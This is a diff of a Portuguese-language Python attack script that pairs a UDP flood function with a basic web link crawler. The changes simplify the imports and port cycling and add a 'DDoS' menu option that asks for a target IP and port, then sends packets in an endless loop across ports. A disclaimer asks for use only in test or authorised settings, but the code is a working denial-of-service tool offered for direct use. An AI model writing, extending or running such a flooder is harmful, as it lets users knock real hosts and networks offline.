@@ -8,48 +8,26 @@ Use com responsabilidade e apenas em ambientes de teste ou com autorização exp
 SÓ TESTANDO SCRIPT PARA USER O TESTAR
 """
 
-try:
-    import colorama
-except ImportError:
-    import os
-    os.system("pip install colorama")
-    import colorama
-
-try:
-    from tqdm.auto import tqdm
-except ImportError:
-    import os
-    os.system("pip install tqdm")
-    from tqdm.auto import tqdm
-
-import requests
-import re
-from optparse import OptionParser
-import sys
 import os
-import socket
-from termcolor import colored
-from colorama import Fore, Back, Style
+import sys
 import time
 import random
+import socket
+import requests
+import re
 from urllib import request
+from tqdm.auto import tqdm
+from termcolor import colored
+from colorama import Fore, Style, init
 
-colorama.init()
-
-if sys.version_info[0] >= 3:
-    from urllib.parse import urljoin
-else:
-    from urlparse import urljoin
+init()
 
 def clearConsole():
-    command = 'clear'
-    if os.name in ('nt', 'dos'):
-        command = 'cls'
-    os.system(command)
+    os.system('cls' if os.name in ('nt', 'dos') else 'clear')
 
 def banner():
     clearConsole()
-    print(Fore.RED + r"""
+    print(Fore.RED + """
           || .---.          || .---.          || .---.          || .---.
           ||/_____/         ||/_____/         ||/_____/         ||/_____/
           ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
@@ -62,8 +40,6 @@ def banner():
         \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
         /\|/_  | Ll_\ |   /\|/_  | Ll_\ |   /\|/_  | Ll_\ |   /\|/_  | Ll_\ |
            |   |   ||/       |   |   ||/       |   |   ||/       |   |   ||/
-           |   |   |         |   |   |         |   |   |         |   |   |
-           |   |   |         |   |   |         |   |   |         |   |   |
            |   |   |         |   |   |         |   |   |         |   |   |
            L___l___J         L___l___J         L___l___J         L___l___J
             |_ | _|           |_ | _|           |_ | _|           |_ | _|
@@ -78,12 +54,8 @@ def ddos(ip, port):
         while True:
             sock.sendto(bytes_data, (ip, port))
             sent += 1
-            port += 1
+            port = 1 if port >= 65534 else port + 1
             print(Fore.RED + f"Enviado {sent} pacote(s) para {ip} na porta {port}" + Fore.RESET)
-            if port >= 65534:
-                port = 1
-            elif port == 1900:
-                port = 1901
     except KeyboardInterrupt:
         print(Fore.RED + "\nInterrompido pelo usuário." + Fore.RESET)
 
@@ -94,9 +66,8 @@ class Crawler:
     def crawl(self, url):
         try:
             response = requests.get(url)
-            status_code = response.status_code
-            if status_code in [401, 403, 404, 500, 502, 503, 504]:
-                print(Fore.RED + f"[Erro {status_code}] Problema ao acessar: {url}" + Fore.RESET)
+            if response.status_code in [401, 403, 404, 500, 502, 503, 504]:
+                print(Fore.RED + f"[Erro {response.status_code}] Problema ao acessar: {url}" + Fore.RESET)
                 return
             links = re.findall(r'href=["\'](http[s]?://[^"\']+)', response.text)
             for link in links:
@@ -122,19 +93,20 @@ def main():
 
     while True:
         banner()
-        print(Fore.GREEN + Style.BRIGHT + "1." + Style.RESET_ALL + Fore.YELLOW + " Domínio do site")
-        print(Fore.GREEN + Style.BRIGHT + "2." + Style.RESET_ALL + Fore.YELLOW + " Endereço IP")
-        print(Fore.GREEN + Style.BRIGHT + "3." + Style.RESET_ALL + Fore.YELLOW + " Spider Crawler")
-        print(Fore.GREEN + Style.BRIGHT + "4." + Style.RESET_ALL + Fore.YELLOW + " Sair")
-        opt = str(input(Fore.RED + Style.BRIGHT + "\n>>> " + Fore.RESET))
-
-        if opt == '3':
-            spider_url = input(Fore.CYAN + "URL para rastrear: " + Fore.RESET)
+        print(Fore.GREEN + Style.BRIGHT + "1." + Style.RESET_ALL + Fore.YELLOW + " DDoS")
+        print(Fore.GREEN + Style.BRIGHT + "2." + Style.RESET_ALL + Fore.YELLOW + " Spider Crawler")
+        print(Fore.GREEN + Style.BRIGHT + "3." + Style.RESET_ALL + Fore.YELLOW + " Sair")
+        opt = input(Fore.RED + Style.BRIGHT + "\n>>> " + Fore.RESET)
+        if opt == '1':
+            ip = input(Fore.CYAN + "Digite o IP para ataque DDoS: " + Fore.RESET)
+            port = int(input(Fore.CYAN + "Digite a porta: " + Fore.RESET))
+            ddos(ip, port)
+        elif opt == '2':
+            url = input(Fore.CYAN + "Digite a URL para Spider Crawler: " + Fore.RESET)
             crawler = Crawler()
-            crawler.crawl(spider_url)
+            crawler.crawl(url)
             crawler.result_count()
-            input(Fore.YELLOW + "Pressione Enter para continuar..." + Fore.RESET)
-        elif opt == '4':
+        elif opt == '3':
             print(Fore.RED + "Saindo..." + Fore.RESET)
             return
         else:
@@ -142,4 +114,4 @@ def main():
             time.sleep(2)
 
 main()
-        
+            
